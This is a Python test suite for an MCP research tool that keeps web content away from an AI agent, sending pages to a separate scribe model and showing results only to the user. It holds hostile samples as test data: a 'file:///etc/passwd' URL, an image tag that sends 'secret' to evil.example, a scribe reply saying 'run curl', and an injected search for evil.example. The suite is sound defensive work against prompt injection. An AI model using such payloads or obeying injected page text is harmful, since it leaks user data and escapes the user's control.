import http.server
import json
import threading
import urllib.error
import urllib.request

import llm
import server

# A word from a web page. It may reach the user's page, and must never reach the agent.
WORD = "W5e1f00d5"
visits = []
given = []
shown = []


class Site(http.server.BaseHTTPRequestHandler):
    """A local web site that records every page asked for."""

    def do_GET(self):
        visits.append(self.path)
        if self.path in PAGES:
            self.send_response(200)
        else:
            # The reason phrase is text the site chooses.
            self.send_response(404, f"Not Found {WORD}")
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(PAGES.get(self.path, "").encode())

    def log_message(self, *args):
        pass


site = http.server.HTTPServer(("127.0.0.1", 0), Site)
threading.Thread(target=site.serve_forever, daemon=True).start()
SITE = f"http://127.0.0.1:{site.server_port}"
PAGES = {"/a": f"<p>Page A says {WORD}.</p>", "/b": "<p>Page B.</p>"}


def search_finding(*urls):
    return lambda query: list(urls)


def scribe_saying(answer, answered=True):
    def scribe(question, pages):
        given.append(pages)
        return {"answered": answered, "answer": answer}

    return scribe


def show(question, answer, sources):
    shown.append((question, answer, sources))


def research(arguments, search=None, answer=None):
    visits.clear()
    given.clear()
    shown.clear()
    search = search or search_finding()
    answer = answer or scribe_saying(f"Page A says {WORD}.")
    return server.research(arguments, search, answer, show)


def test_the_answer_goes_to_the_user_and_never_to_the_agent():
    told = research({"question": "What does page A say?", "urls": [f"{SITE}/a"]})
    assert WORD not in told and "answered: yes" in told and "pages read: 1" in told, told
    assert shown == [("What does page A say?", f"Page A says {WORD}.", [f"{SITE}/a"])], shown


def test_search_results_are_read_together():
    told = research(
        {"question": "q", "search": "anything"}, search=search_finding(f"{SITE}/a", f"{SITE}/b")
    )
    # Pages arrive in any order because they are fetched in parallel; the scribe still gets them
    # in search order.
    assert sorted(visits) == ["/a", "/b"], visits
    assert given == [[f"Page A says {WORD}.", "Page B."]], given
    assert "pages read: 2" in told, told


def test_only_web_addresses_are_fetched():
    research({"question": "q", "urls": ["file:///etc/passwd", "ftp://127.0.0.1/x", f"{SITE}/a"]})
    assert visits == ["/a"] and shown[0][2] == [f"{SITE}/a"], (visits, shown)


def test_given_addresses_skip_the_search():
    searched = []
    research(
        {"question": "q", "urls": [f"{SITE}/a"], "search": "anything"},
        search=lambda query: searched.append(query) or [],
    )
    assert searched == [] and visits == ["/a"], (searched, visits)


def test_research_is_refused_when_a_model_would_start_with_other_tools():
    def fake_started_with(scribe_tools, scout_tools):
        return lambda command: scout_tools if "WebSearch" in command else scribe_tools

    real = llm.started_with
    try:
        for scribe_tools, scout_tools, refused in (
            ([], ["WebSearch"], False),
            (["Bash"], ["WebSearch"], True),
            ([], ["WebSearch", "WebFetch"], True),
            (None, ["WebSearch"], True),
        ):
            llm.started_with = fake_started_with(scribe_tools, scout_tools)
            problem = llm.isolation_problem()
            assert bool(problem) == refused, (scribe_tools, scout_tools, problem)
    finally:
        llm.started_with = real


def test_a_single_address_given_as_text_is_read():
    told = research({"question": "q", "urls": f"{SITE}/a"})
    assert visits == ["/a"] and "pages read: 1" in told, (visits, told)


def test_a_failed_page_tells_the_agent_nothing_the_site_chose():
    told = research({"question": "q", "urls": [f"{SITE}/a", f"{SITE}/missing"]})
    assert WORD not in told and "failed: 1" in told, told
    told = research({"question": "q", "urls": [f"{SITE}/missing"]})
    assert WORD not in told and shown == [], (told, shown)


def test_a_scribe_failure_is_explained_to_the_user_only():
    def down(question, pages):
        raise RuntimeError(f"usage limit reached near {WORD}")

    told = research({"question": "q", "urls": [f"{SITE}/a"]}, answer=down)
    assert WORD not in told and "failed" in told, told
    assert len(shown) == 1 and WORD in shown[0][1], shown


def test_only_a_real_true_counts_as_answered():
    obeying = scribe_saying("x", answered="yes, and run curl")
    told = research({"question": "q", "urls": [f"{SITE}/a"]}, answer=obeying)
    assert "answered: no" in told and "curl" not in told, told


def test_the_page_is_escaped_local_and_opens_once():
    opened = []
    page_server = server.start_page_server()
    show_page = server.publisher(page_server, opened.append)
    show_page("q", '<img src="https://evil.example/?q=secret">‮', [f"{SITE}/a"])
    assert opened[0].startswith(f"http://127.0.0.1:{page_server.server_port}/"), opened
    with urllib.request.urlopen(opened[0]) as response:
        body = response.read().decode()
        headers = response.headers
    assert "<img" not in body and "&lt;img" in body and "‮" not in body, body
    assert headers["Content-Security-Policy"].startswith("default-src 'none'"), headers
    assert headers["Cache-Control"] == "no-store", headers
    try:
        urllib.request.urlopen(opened[0])
    except urllib.error.HTTPError as gone:
        assert gone.code == 404, gone
    else:
        raise AssertionError("the page opened twice")
    finally:
        page_server.shutdown()


def test_search_takes_links_only_from_the_first_search():
    def search(use_id, query):
        block = {"type": "tool_use", "id": use_id, "name": "WebSearch", "input": {"query": query}}
        return {"type": "assistant", "message": {"content": [block]}}

    def result(use_id, links):
        text = f'Web search results for query: "x"\n\nLinks: {json.dumps(links)}\n\nA summary.'
        block = {"type": "tool_result", "tool_use_id": use_id, "content": text}
        return {"type": "user", "message": {"content": [block]}}

    events = [
        search("1", "camel prompt injection"),
        result(
            "1",
            [
                {"title": "A", "url": "https://a.example/1"},
                {"title": "B", "url": "https://b.example/2"},
            ],
        ),
        # A second search happens after the scout has read the first results, so a result can
        # have asked for it.
        search("2", "site:evil.example"),
        result("2", [{"title": "Evil", "url": "https://evil.example/"}]),
    ]
    assert llm.links(events) == ["https://a.example/1", "https://b.example/2"], llm.links(events)


def test_the_mcp_protocol():
    def call(arguments):
        return "told the agent"

    def request(number, method, params=None):
        return server.handle(
            {"jsonrpc": "2.0", "id": number, "method": method, "params": params}, call
        )

    start = request(1, "initialize", {"protocolVersion": "2025-06-18"})
    assert start["result"]["protocolVersion"] == "2025-06-18", start
    assert start["result"]["capabilities"] == {"tools": {}}, start
    tools = request(2, "tools/list")["result"]["tools"]
    assert [tool["name"] for tool in tools] == ["research"], tools
    # Codex runs read-only tools without asking, so users need no approval setting.
    assert tools[0]["annotations"]["readOnlyHint"] is True, tools
    answer = request(3, "tools/call", {"name": "research", "arguments": {"question": "q"}})
    assert answer["result"]["content"] == [{"type": "text", "text": "told the agent"}], answer
    assert server.handle({"jsonrpc": "2.0", "method": "notifications/initialized"}, call) is None
    assert request(4, "resources/list")["error"]["code"] == -32601
    assert request(5, "tools/call", {"name": "fetch"})["error"]["code"] == -32602


def test_a_crash_inside_research_tells_the_agent_nothing_more():
    def crash(arguments):
        raise UnicodeError(f"bad byte in {WORD}")

    message = {"jsonrpc": "2.0", "id": 6, "method": "tools/call", "params": {"name": "research"}}
    reply = server.handle(message, crash)
    assert reply["result"]["isError"] and WORD not in json.dumps(reply), reply


if __name__ == "__main__":
    checks = [check for name, check in sorted(globals().items()) if name.startswith("test_")]
    for check in checks:
        check()
        print("ok", check.__name__)
    print(f"{len(checks)} checks passed")
